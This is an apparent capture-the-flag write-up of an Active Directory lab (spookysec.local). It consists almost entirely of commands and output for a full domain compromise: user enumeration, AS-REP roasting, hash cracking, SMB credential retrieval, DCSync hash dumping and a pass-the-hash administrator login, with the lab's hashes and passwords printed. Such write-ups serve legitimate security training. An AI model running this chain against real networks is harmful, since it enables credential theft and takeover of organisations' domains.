
# nmap -sVC 10.10.96.84 -T4

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-16 17:47 EET
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.96.84, 16) => Operation not permitted
Offending packet: TCP 10.2.92.176:64370 > 10.10.96.84:53 S ttl=38 id=49382 iplen=44  seq=1945375481 win=1024 <mss 1460>
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.96.84, 16) => Operation not permitted
Offending packet: TCP 10.2.92.176:64371 > 10.10.96.84:53 S ttl=47 id=21233 iplen=44  seq=1945441016 win=1024 <mss 1460>
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.96.84, 16) => Operation not permitted
Offending packet: TCP 10.2.92.176:64372 > 10.10.96.84:53 S ttl=59 id=42740 iplen=44  seq=1945506555 win=1024 <mss 1460>
Nmap scan report for 10.10.96.84
Host is up (0.37s latency).
Not shown: 987 closed ports
PORT     STATE    SERVICE       VERSION
53/tcp   filtered domain
80/tcp   open     http          Microsoft IIS httpd 10.0
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-16 15:48:19Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     tcpwrapped
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open     tcpwrapped
3389/tcp open     ms-wbt-server Microsoft Terminal Services
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.30 seconds
```

# AD Users Enumeration 
  ./kerbrute userenum -d spookysec.local --dc 10.10.246.162 userlist.txt 
 ``` 
james@spookysec.local
svc-admin@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
administrator@spookysec.local
backup@spookysec.local
paradox@spookysec.local 
```

# AS-REP ROASTING 
   python3 GetNPUsers.py spookysec.local/ -userfile users.txt -no-pass -dc-ip 10.10.246.162
 ```  
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set  
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9e9d37205ca2b017be8b60ae4decc7d8$4d81d588e53cd91588752a3d06537c32d95b9e71c8ad9000bfb2442ae8fdd36a7448fca372decebd0d6ef2a0020b5eea2d690503018447cbd9422ff59fe0aa62777c8840112179b56a1971f083ca17ef83a29d4815f86c3c5836420de128f7c9d6975bd367c02b2f22ce506b61ce0ebaa2a664b59fa40a7fa1d04db8654d62c3f09c803025e270ef112a2f833b4e2d8bc1fe756d58fa734277b25b77e521e57a7a77dc19d517a692704f5c68a5593f552bacc82202f44fecf34ddf36f97ed54d65432eef3739fad5b9ce14fbf81b306503b0191dd3eda6ed3e7ade34bb37cc1b3ee16b240369df8fb7cb79d367bee2c66b2c
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set  
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set  
```
# John Hash.txt
```  svc-admin:management2005```

# smbclient -L //10.10.83.246 -U 'svc-admin' 
```	
        Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```
# smbclient //10.10.83.246/backup -U 'svc-admin'

# smb: \> get backup_credentials.txt
```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
backup@spookysec.local:backup2517860
```
#  DCSync
 python3 secretsdump.py -dc-ip 10.10.83.246 spookysec.local/backup:backup2517860@10.10.83.246 -use-vss
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
```

#  Pass The Hash
    evil-winrm -i 10.10.83.246 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
```

